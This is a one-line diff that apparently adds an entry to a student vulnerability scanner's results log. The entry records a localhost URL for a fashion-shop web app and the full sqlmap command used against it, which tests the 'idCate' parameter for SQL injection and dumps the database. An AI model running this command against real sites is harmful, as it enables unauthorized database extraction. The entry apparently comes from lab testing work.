@@ -1,0 +1,1 @@
+http://localhost/qlthoitrang/?frame=chitietsp&idCate=1&id=7 (GET)  # /usr/bin/sqlmap -u http://localhost/qlthoitrang/?frame=chitietsp&idCate=1&id=7 -p idCate --time-sec 10 --random-agent --skip-static --threads=10 --batch --dump --output-dir=/home/kali/pbl6/PBL6-final/PBL6_VulnScanner/sqlmap_results
